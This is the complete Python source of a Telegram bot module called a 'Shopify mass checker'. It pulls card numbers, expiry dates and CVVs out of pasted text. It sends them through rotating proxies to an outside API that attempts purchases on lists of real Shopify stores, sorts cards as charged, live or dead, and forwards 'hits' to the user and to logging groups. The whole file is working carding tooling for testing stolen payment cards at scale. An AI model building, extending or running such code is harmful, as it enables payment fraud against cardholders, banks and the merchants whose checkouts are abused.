"""
sh.py  v18  —  /sh single-card + /msh mass Shopify checker
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Framework : python-telegram-bot v21  (NOT aiogram)
API       : https://goshopi.up.railway.app/shopii
            URL: {API_URL}?site={site}&cc={card}&proxy={proxy}
            proxy = raw ip:port  (NO http:// prefix)
            Only 3 params — no extra fields!

PROGRESS UI (exact):
  🛒 Gate ➳ Shopify
  🔄 Progress ➳ 0/191
  Charged ➳ 0 💎
  Live    ➳ 0 ✅
  Dead    ➳ 0 ❌
  Errors  ➳ 0 ⚠️
  Time    ➳ 0s
  👤 ➳ Tom ⭐
  ⚡ ➳ Batmancardchk ⭐

BUTTONS:
  Row 1 : [Live (N)]  [All (N)]
  Row 2 : [⛔ Stop]   ← only while running

DM POLICY:
  CHARGED → DM to user  +  HIT_LOG_GROUP_ID  +  EXTRA_CHARGED_GROUP_ID
  LIVE    → DM to user only
  DEAD    → NOT sent anywhere (just counted)
  ERROR   → NOT sent anywhere (just counted)

EXPORTS FOR main.py:
  get_sh_handler()
  _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
  MSH_SESSIONS, run_mass_batch, create_msh_session
  cb_msh_result, cb_msh_stop, build_result_msg
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
from __future__ import annotations

import asyncio
import json as _json
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID,
    get_bin_info, tg_emoji,
    get_plan_emoji_id, get_random_live_emoji,
    RawMarkup, _btn,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
    DEV_EMOJI_ID, PRO_EMOJI_ID,
    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID, PROG_CHARGED_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
    LIVE_EMOJI_IDS, PLAN_EMOJIS, SPECIAL_FONT_MAP,
    BOT_NAME, CHANNEL_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URL      = "https://goshopi.up.railway.app/shopii"
BOT_CHANNEL  = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

# Change these to your actual group IDs
HIT_LOG_GROUP_ID       = -1004361062205
EXTRA_CHARGED_GROUP_ID = -1003991915326

SH_COOLDOWN    = 25    # free-user cooldown (seconds)
SITE_RETRIES   = 25    # max sites tried per card before giving up
SITE_TIMEOUT   = 30    # seconds per single API call
MAX_CONCURRENT = 20    # parallel card workers
BUTTON_LOCK    = 30    # seconds before download buttons unlock

_CB_RESULT = "mshr"
_CB_STOP   = "mshs"

MSH_SESSIONS: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDS  (from reference msh_(8)_1784828416954.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
LIVE_EMOJI_ID     = "4958610528588008305"
DECLINED_EMOJI_ID = "4956612582816351459"

HIT_GATE_EMOJI_ID = "5341715473882955310"
HIT_RESP_EMOJI_ID = "5839116473951328489"

BTN_LIVE_EMOJI_ID = "5039793437776282663"
BTN_ALL_EMOJI_ID  = "4956324463525233747"
BTN_STOP_EMOJI_ID = "6179444193518162239"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLASSIFIER  (from reference msh_(8)_1784828416954.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'DELIVERY_ZONE_NOT_FOUND', 'site error! status: 429',
    'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'VALIDATION_CUSTOM', 'connection error', 'connection error!',
    'error processing card', '504', 'server error', 'client error',
    'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'token not found', 'invalid_response', 'resolve', 'item',
    'curl error', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    'could not resolve host', 'connect tunnel failed', 'timeout',
    'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'no available products found', 'could not extract receiptid',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'INVENTORY_FAILURE',
    'products.json', 'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'store incompatible', 'extract signedHandles', 'missing receiptId',
    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
    'application not found', 'app not found', 'store not found',
    'site error! status: 404', 'site error! status: 500',
    'site error! status: 403', 'HTTP Error',
    'no proxies', 'no available proxies',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED', 'GENERIC_ERROR',
]


def classify_response(message: str) -> str:
    """
    Returns CHARGED | TDS | LIVE | DEAD | RETRY
    (ERROR is no longer returned — exhausted-site loop yields DEAD instead)
    """
    if not message:
        return "RETRY"

    mu = message.upper().strip()
    ml = message.lower().strip()

    # ── CHARGED ──────────────────────────────────────────────────
    if any(k in mu for k in (
        "ORDER_PAID", "CHARGED", "PAYMENT_AUTHORIZED",
        "PAYMENT_ACCEPTED", "APPROVED", "SUCCESSFUL",
    )):
        return "CHARGED"

    # ── 3DS / SCA — card is live, bank wants auth ─────────────────
    if any(k in mu for k in (
        "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
        "SECURE_AUTHENTICATION", "SCA_REQUIRED",
        "REDIRECT_3D", "3DS", "3D SECURE",
    )):
        return "TDS"

    # ── LIVE — bank confirmed card exists but not enough funds/cvv ─
    if any(k in mu for k in (
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
        "INCORRECT_CVV", "INCORRECT_CVC", "INVALID_CVC",
        "INCORRECT_ZIP", "CVV_FAILED", "CVC_FAILED",
        "DO_NOT_HONOR", "DO NOT HONOR",
        "SECURITY_VIOLATION", "SECURITY VIOLATION",
    )):
        return "LIVE"

    # ── DEAD — definitive bank decline ───────────────────────────
    if any(k in mu for k in (
        "CARD_DECLINED", "DECLINED", "GENERIC_ERROR", "GENERIC_DECLINE",
        "PROCESSING_ERROR", "FRAUD_SUSPECTED",
        "DECISION_RULE_BLOCK", "PICK_UP_CARD",
        "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD",
        "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
        "STOLEN_CARD", "LOST_CARD", "EXPIRED_CARD",
        "INCORRECT_NUMBER", "AMOUNT_TOO_SMALL",
        "CALL_ISSUER", "TEST_MODE_LIVE_CARD",
        "UNKNOWN_ERROR",          # from API — card definitely bad
    )):
        return "DEAD"

    # ── RETRY — site/proxy/network issue, not the card's fault ────
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    # ── Unknown response — treat as DEAD rather than ERROR ────────
    # "Unknown Error" from _parse_response_field means we got a real
    # response we can't categorise — safest to count as DEAD (skip card)
    # rather than silently keep looping and inflating the error counter.
    return "DEAD"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER  — px.txt first, then proxies.txt
# Stores raw strings (ip:port) — API wants bare proxy, no http://
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_ALL_PROXIES: list = []

def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p

def _load_proxies() -> list:
    global _ALL_PROXIES
    import os
    candidates = []
    for fname in ("px.txt", "proxies.txt"):
        candidates += [
            fname,
            os.path.join("..", fname),
            os.path.join(os.path.dirname(__file__), fname),
        ]
    for path in candidates:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw = [l.strip() for l in f
                       if l.strip() and not l.startswith(("#", "//", ";"))]
            if raw:
                lines = [_strip_proxy_scheme(p) for p in raw]
                _ALL_PROXIES = lines
                logging.info(f"[SH] {len(lines)} proxies from {path}")
                return lines
        except (FileNotFoundError, PermissionError):
            pass
    logging.warning("[SH] No proxy file — API needs proxies (px.txt)!")
    _ALL_PROXIES = []
    return []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE LOADER  — sites.txt, bare domains
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")

def _load_sites() -> list:
    import os
    candidates = [
        "sites.txt",
        os.path.join("..", "sites.txt"),
        os.path.join(os.path.dirname(__file__), "sites.txt"),
    ]
    for path in candidates:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                lines = [_strip_scheme(l) for l in f
                         if l.strip() and not l.startswith("#")]
            lines = [l for l in lines if l]
            if lines:
                random.shuffle(lines)
                logging.info(f"[SH] {len(lines)} sites from {path}")
                return lines
        except (FileNotFoundError, PermissionError):
            pass
    return ["aloracosmetics.myshopify.com"]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    total = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# Fresh ClientSession per call, f-string URL, text→json.loads
# Proxy sent as raw ip:port query param — NO http:// prefix
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _parse_response_field(data: dict) -> str:
    """
    Try every field name the API might use for the result.
    Returns the first non-empty string found, or "Unknown Error".
    This prevents the silent fallback that turns every unknown
    field name into an ERROR verdict.
    """
    for key in ("Response", "response", "message", "Message",
                "error", "Error", "status", "Status",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and str(val).strip():
            return str(val).strip()
    return "Unknown Error"


async def _call_api(
    card: str,
    site: str,
    proxy: Optional[str],
    timeout: float = SITE_TIMEOUT,
) -> tuple:
    """
    Returns (api_response_str, gateway_str, price_str, currency_str, http_status).
    One attempt per call — the outer retry loop in _check_card_with_retry
    handles site/proxy rotation. No inner retry sleep stacking here.
    """
    site = _strip_scheme(site)
    url  = (f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
            if proxy else f"{API_URL}?site={site}&cc={card}")

    _to = aiohttp.ClientTimeout(total=timeout, connect=15, sock_read=timeout)

    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as resp:
                http_status = resp.status
                if resp.status == 200:
                    raw = await resp.text()
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        # Not JSON — treat raw text as the response string
                        raw = raw.strip()[:200]
                        logging.warning(f"[API] Non-JSON: {raw!r}")
                        return (raw or "Invalid JSON", "Shopify Payments",
                                "0.00", "USD", http_status)

                    gateway  = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
                    price    = str(data.get("Price")     or data.get("price")    or "0.00")
                    currency = str(data.get("Currency")  or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)

                    logging.info(f"[API] {card[:6]}** | {site} | {api_resp!r}")
                    return api_resp, gateway, price, currency, http_status

                # Non-200: map to a string the classifier understands
                err_map = {
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 500",
                    503: "site error! status: 500",
                    504: "timeout",
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                }
                err_str = err_map.get(resp.status, f"HTTP Error {resp.status}")
                return (err_str, "Shopify Payments", "0.00", "USD", resp.status)

    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    session,            # unused — kept for main.py compat
    card: str,
    sites: list,
    proxies: list,
    max_sites: int = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str = "",
) -> tuple:
    """
    Tries up to max_sites different Shopify stores for this card.
    • CHARGED / TDS / LIVE / DEAD  → return immediately (final verdict)
    • RETRY / ERROR                → try the next site (short backoff only)
    • All sites exhausted          → return DEAD (card tried, nothing confirmed)
    NO pre-call sleep — the semaphore in run_mass_batch throttles concurrency.
    Small backoff ONLY after a RETRY/ERROR verdict (0.3 – 0.8 s).
    """
    if not sites:
        sites = ["aloracosmetics.myshopify.com"]

    # Filter out sites already known to return 404/403 — saves time on every card
    live_sites = [s for s in sites if s not in _DEAD_SITES]
    if not live_sites:
        live_sites = sites[:]           # if all are blacklisted, reset and retry
        _DEAD_SITES.clear()
    pool    = live_sites[:]
    random.shuffle(pool)
    px_pool = proxies if proxies else _ALL_PROXIES

    tried: list     = []
    price, currency = "0.00", "USD"
    last_resp       = "All sites failed"
    conn_fail_streak = 0          # count back-to-back proxy/connection failures

    for attempt in range(max_sites):
        # ── Stop check ──────────────────────────────────────────────
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        # ── Site pick (cycle pool when all tried) ───────────────────
        untried = [s for s in pool if s not in tried]
        if not untried:
            tried = []
            untried = list(pool)
        site = random.choice(untried)
        tried.append(site)

        # ── Proxy pick — always raw ip:port ─────────────────────────
        proxy = random.choice(px_pool) if px_pool else None

        # ── API call ─────────────────────────────────────────────────
        try:
            resp, gw, price, currency, http_st = await _call_api(
                card, site, proxy, timeout=site_timeout
            )
        except asyncio.CancelledError:
            raise
        except Exception as e:
            last_resp = f"connection error: {str(e)[:40]}"
            conn_fail_streak += 1
            # exponential-ish back-off when proxies keep dying
            await asyncio.sleep(min(0.5 * conn_fail_streak, 3.0))
            continue

        conn_fail_streak = 0
        last_resp = resp
        verdict   = classify_response(resp)

        logging.info(f"[SH] {card[:6]}** attempt={attempt+1} site={site} "
                     f"resp={resp!r} → {verdict}")

        # ── Mark dead sites so future cards skip them ────────────────
        # 404 = site not found / not a Shopify store — blacklist it
        if "status: 404" in resp or "status: 403" in resp:
            _DEAD_SITES.add(site)
            logging.debug(f"[SH] Dead site added: {site}")

        # ── Final verdicts — stop here ───────────────────────────────
        if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
            return verdict, resp, price, currency

        # ── Pause before trying the next site ───────────────────────
        if attempt < max_sites - 1:
            if "429" in resp or "rate" in resp.lower():
                await asyncio.sleep(random.uniform(2.0, 4.0))
            else:
                await asyncio.sleep(random.uniform(0.8, 1.8))

    # Exhausted all sites → card is effectively dead (no bank confirmed LIVE/CHARGED)
    return "DEAD", last_resp, price, currency

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_BIN_CACHE:   dict = {}
_DEAD_SITES:  set  = set()   # sites that returned 404 — skipped on future cards

def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:      return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:             return v
    return PRO_EMOJI_ID

def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0.00 USD"

def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))

def _get_ud(uid: int, ctx) -> dict:
    return ctx.bot_data.setdefault("users", {}).setdefault(uid, {})

def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

async def _fetch_bin_direct(bin6: str) -> dict:
    """
    Direct BIN lookup against public APIs — no dependency on config.get_bin_info.
    Tries three sources in order; returns the first non-empty result.
    """
    COUNTRY_FLAGS = {
        "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺",
        "DE": "🇩🇪", "FR": "🇫🇷", "IN": "🇮🇳", "BR": "🇧🇷",
        "MX": "🇲🇽", "JP": "🇯🇵", "CN": "🇨🇳", "RU": "🇷🇺",
        "IT": "🇮🇹", "ES": "🇪🇸", "NL": "🇳🇱", "SE": "🇸🇪",
        "NG": "🇳🇬", "ZA": "🇿🇦", "EG": "🇪🇬", "PK": "🇵🇰",
        "SG": "🇸🇬", "MY": "🇲🇾", "ID": "🇮🇩", "TH": "🇹🇭",
        "PH": "🇵🇭", "VN": "🇻🇳", "AE": "🇦🇪", "SA": "🇸🇦",
        "TR": "🇹🇷", "PL": "🇵🇱", "UA": "🇺🇦", "AR": "🇦🇷",
        "CO": "🇨🇴", "CL": "🇨🇱", "NZ": "🇳🇿", "BO": "🇧🇴",
        "HK": "🇭🇰", "TW": "🇹🇼", "KR": "🇰🇷", "IL": "🇮🇱",
        "CH": "🇨🇭", "BE": "🇧🇪", "AT": "🇦🇹", "PT": "🇵🇹",
        "GR": "🇬🇷", "CZ": "🇨🇿", "HU": "🇭🇺", "RO": "🇷🇴",
        "BG": "🇧🇬", "HR": "🇭🇷", "SK": "🇸🇰", "FI": "🇫🇮",
        "DK": "🇩🇰", "NO": "🇳🇴", "IE": "🇮🇪",
    }

    sources = [
        # Source 1: binlist.net (most reliable, free, no key needed)
        {
            "url":  f"https://lookup.binlist.net/{bin6}",
            "hdrs": {"Accept-Version": "3"},
            "parse": lambda d: {
                "scheme":        (d.get("scheme") or d.get("brand") or "").upper(),
                "bank":          (d.get("bank")   or {}).get("name", ""),
                "country":       (d.get("country") or {}).get("name", ""),
                "country_code":  (d.get("country") or {}).get("alpha2", ""),
                "type":          d.get("type", ""),
                "prepaid":       d.get("prepaid", False),
            },
        },
        # Source 2: handy.codes proxy (mirrors binlist)
        {
            "url":  f"https://api.handy.codes/bin/{bin6}",
            "hdrs": {},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or d.get("type") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", d.get("iso", "")),
            },
        },
        # Source 3: bincodes.com
        {
            "url":  f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}",
            "hdrs": {},
            "parse": lambda d: {
                "scheme":       (d.get("card") or d.get("scheme") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", ""),
            },
        },
    ]

    _to = aiohttp.ClientTimeout(total=8, connect=5)
    for src in sources:
        try:
            async with aiohttp.ClientSession(timeout=_to,
                    headers={"User-Agent": "Mozilla/5.0"}) as sess:
                async with sess.get(src["url"],
                                    headers=src["hdrs"], ssl=False) as r:
                    if r.status != 200:
                        continue
                    data = await r.json(content_type=None)
                    info = src["parse"](data)
                    if not info.get("scheme") and not info.get("bank"):
                        continue
                    # attach country flag
                    cc = (info.get("country_code") or "").upper()[:2]
                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
                    return info
        except Exception:
            continue
    return {}


async def _bin_lookup(bin6: str) -> dict:
    """Try config.get_bin_info first; fall back to direct public BIN APIs."""
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]

    result: dict = {}

    # Primary: config.py's get_bin_info (may use a paid/private API)
    try:
        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
    except Exception:
        result = {}

    # If primary returned nothing useful, try public APIs directly
    if not result or not result.get("scheme"):
        try:
            result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
        except Exception:
            result = {}

    _BIN_CACHE[bin6] = result
    return result

def _bin_str(bd: dict) -> str:
    """Handles field names from config.get_bin_info AND all three fallback APIs."""
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null"):
                return str(v).strip()
        return "N/A"

    scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
    bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
    country = escape(_g("country", "country_name", "country_full"))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE BUILDER
# (used for both /sh and the DM hit messages)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(
    card: str, resp: str, verdict: str,
    bin_data: dict, price: str, currency: str,
    elapsed: float, user, plan: str,
) -> str:
    ulink     = _user_link(user)
    peid      = _plan_eid(plan)
    ts        = _fmt_time(elapsed)
    bin_s     = _bin_str(bin_data)
    ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
    safe_resp = escape(resp)

    if verdict == "CHARGED":
        eid       = random.choice(CHARGED_EMOJI_IDS)
        status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
    elif verdict == "TDS":
        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "LIVE":
        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
    elif verdict == "DEAD":
        status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
    else:
        status_ln = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID,"⚠️")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'

    return (
        f"{status_ln}\n\n"
        f"<b>{_te(CARD_EMOJI_ID,'💳')}</b>\n"
        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
        f"{gate_ln}\n"
        f"<b>──────────</b>\n"
        f"<b>Resp ➳ {safe_resp}</b>\n"
        f"<b>Bin  ➳ {bin_s}</b>\n"
        f"<b>──────────</b>\n"
        f"<b>{_te(TIME_EMOJI_ID,'⏱')} ➳ {ts}</b>\n"
        f"<b>{_te(USER_EMOJI_ID,'👤')} ➳ {ulink} {_te(peid,'⭐')}</b>\n"
        f"<b>{_te(DEV_EMOJI_ID,'⚡')} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,'⭐')}</b>"
    )

_build_result_msg = build_result_msg   # compat alias

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS TEXT  (new UI — exact match to user spec)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    ts   = _fmt_time(time.time() - sess["start_time"])
    uobj = sess.get("user_obj")
    ulink = _user_link(uobj) if uobj else "User"
    peid  = sess.get("plan_eid", PRO_EMOJI_ID)

    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["approved"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
        f'<b>Time    ➳ {ts}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS  — Live | All | Stop
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess  = MSH_SESSIONS.get(sid, {})
    live_n = sess.get("approved", 0)
    all_n  = sess.get("checked",  0)

    rows = [[
        _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live",
             style="success", icon=BTN_LIVE_EMOJI_ID),
        _btn(f"All ({all_n})",  cb=f"{_CB_RESULT}:{sid}:all",
             style="primary",  icon=BTN_ALL_EMOJI_ID),
    ]]
    if running:
        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
                          style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS UPDATE
